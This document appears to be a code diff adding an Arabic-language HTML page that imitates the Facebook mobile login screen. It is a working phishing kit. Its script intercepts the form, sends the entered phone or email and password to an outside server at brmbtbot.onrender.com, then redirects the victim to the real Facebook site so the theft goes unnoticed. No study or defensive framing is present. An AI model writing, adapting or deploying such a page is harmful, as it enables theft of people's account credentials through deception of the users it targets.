@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook – تسجيل الدخول</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { background-color: #fff; width: 100%; text-align: center; padding: 25px 0; color: #1877f2; font-size: 35px; font-weight: bold; }
+        .login-box { background: #fff; width: 90%; max-width: 400px; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); margin-top: 20px; }
+        input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; background-color: #f5f6f7; }
+        .btn { width: 100%; background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer { margin-top: 60px; color: #737373; font-size: 13px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="header">facebook</div>
+    <div class="login-box">
+        <form id="f">
+            <input type="text" id="u" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <input type="password" id="p" placeholder="كلمة السر" required>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+    </div>
+    <div class="footer">Meta © 2026</div>
+    <script>
+        document.getElementById('f').addEventListener('submit', function(e) {
+            e.preventDefault();
+            fetch('https://brmbtbot.onrender.com/receive', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ platform: 'Facebook Original', u: document.getElementById('u').value, p: document.getElementById('p').value })
+            }).finally(() => { window.location.href = 'https://m.facebook.com'; });
+        });
+    </script>
+</body>
+</html>
